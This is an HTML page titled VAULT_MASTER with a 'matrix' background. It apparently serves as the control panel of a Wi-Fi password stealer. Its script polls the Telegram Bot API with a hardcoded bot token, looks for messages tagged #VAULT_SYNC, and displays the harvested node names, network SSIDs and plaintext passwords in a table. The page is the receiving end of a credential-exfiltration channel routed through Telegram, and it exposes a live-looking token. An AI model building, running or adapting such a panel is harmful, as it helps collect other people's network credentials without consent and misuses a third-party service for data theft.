<!DOCTYPE html><html><head><meta charset='UTF-8'><title>VAULT_MASTER</title>
<style>
    body { background: #000; color: #00ff41; font-family: 'Consolas', monospace; margin: 0; display: flex; height: 100vh; overflow: hidden; }
    #matrix { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.1; }
    .main-view { flex: 1; padding: 30px; overflow-y: auto; position: relative; z-index: 1; }
    h1 { font-size: 20px; letter-spacing: 5px; color: #fff; border-bottom: 2px solid #00ff41; display: inline-block; margin-bottom: 20px;}
    .computer-title { color: #fff; font-size: 16px; margin: 10px 0 5px 0; }
    .meta { font-size: 11px; color: #008f11; margin-bottom: 15px; }
    .wifi-table { width: 100%; border-collapse: collapse; margin-bottom: 20px; background: rgba(0,0,0,0.8); }
    .wifi-table th { text-align: left; font-size: 10px; color: #008f11; padding: 8px; border-bottom: 1px solid #00ff41; }
    .wifi-table td { padding: 8px; font-size: 12px; border-bottom: 1px solid rgba(0, 255, 65, 0.1); }
    .key-text { color: #fff; text-shadow: 0 0 5px #00ff41; }
    #debug-log { position: fixed; bottom: 0; right: 0; background: rgba(0,0,0,0.9); color: yellow; font-size: 10px; padding: 5px; border-top: 1px solid #333; width: 100%; }
</style></head>
<body>
    <canvas id="matrix"></canvas>
    <div class="main-view">
        <h1>NETWORK_VAULT_CENTRAL</h1>
        <div id="vault-content">
            <p style="color:#008f11;">SYSTEM_READY: WAITING FOR INCOMING DATA...</p>
        </div>
    </div>
    <div id="debug-log">DEBUG: Initializing...</div>

    <script>
        const botToken = "8748792185:AAGwPcaQwzh-r5oo9-tjvoPQVuo8q_45v-Y";
        const log = (txt) => document.getElementById('debug-log').innerText = "DEBUG: " + txt;

        async function refresh() {
            try {
                log("Fetching updates from Telegram...");
                // offset=-100 looks back at the last 100 messages to find the sync tag
                const res = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=-100&limit=100&allowed_updates=["message"]`);
                const json = await res.json();
                
                if (!json.ok) { log("API Error: " + json.description); return; }
                
                const container = document.getElementById('vault-content');
                const results = json.result || [];
                
                log("Found " + results.length + " recent updates.");

                // Search for #VAULT_SYNC
                const syncMsgs = results.filter(m => 
                    (m.message && m.message.text && m.message.text.includes("#VAULT_SYNC")) ||
                    (m.channel_post && m.channel_post.text && m.channel_post.text.includes("#VAULT_SYNC"))
                );

                if (syncMsgs.length > 0) {
                    log("Sync tag found! Parsing data...");
                    const latest = syncMsgs[syncMsgs.length - 1];
                    const text = latest.message ? latest.message.text : latest.channel_post.text;
                    
                    const rawJson = text.split('\n')[1];
                    const data = JSON.parse(rawJson);
                    
                    let html = `
                        <div class="session-block">
                            <h2 class="computer-title">NODE: ${data[0].node}</h2>
                            <div class="meta">STATUS: CLOUD_SYNC_ACTIVE | UPDATED: ${new Date().toLocaleTimeString()}</div>
                            <table class="wifi-table">
                                <thead><tr><th>SSID</th><th>KEY</th></tr></thead>
                                <tbody>`;
                    
                    data.forEach(item => {
                        html += `<tr>
                            <td>${item.ssid}</td>
                            <td class='key-text'>${item.pass}</td>
                        </tr>`;
                    });

                    html += `</tbody></table></div>`;
                    container.innerHTML = html;
                    log("Display Updated.");
                } else {
                    log("No #VAULT_SYNC tag found in last 100 messages.");
                }
            } catch(e) { 
                log("Error: " + e.message);
                console.error(e); 
            }
        }

        // Matrix Background
        const c = document.getElementById('matrix'); const ctx = c.getContext('2d');
        c.width = window.innerWidth; c.height = window.innerHeight;
        const s = "01"; const f = 16; const cols = c.width / f; const drops = Array(Math.floor(cols)).fill(1);
        function d() {
            ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, c.width, c.height);
            ctx.fillStyle = "#0F0"; ctx.font = f + "px monospace";
            drops.forEach((y, i) => {
                const txt = s[Math.floor(Math.random() * s.length)];
                ctx.fillText(txt, i * f, y * f);
                if (y * f > c.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            });
        }
        setInterval(d, 40);
        setInterval(refresh, 5000);
        refresh();
    </script>
</body></html>
